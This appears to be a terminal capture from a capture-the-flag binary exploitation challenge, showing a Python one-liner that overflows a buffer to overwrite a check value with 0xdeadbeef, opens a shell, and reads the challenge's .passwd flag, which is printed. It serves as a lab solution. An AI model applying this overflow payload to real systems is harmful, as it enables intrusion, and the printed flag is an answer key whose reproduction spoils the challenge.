```
app-systeme-ch13@challenge02:~$ (python -c 'print "/bin/sh #" + "A" * 31 + "\xef\xbe\xad\xde"'; cat) | ./ch13 

[buf]: /bin/sh #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
cat .passwd
1w4ntm0r3pr0np1s
qa^CShell closed! Bye.

```
-------------------------------------------------------------------------------

#### Text
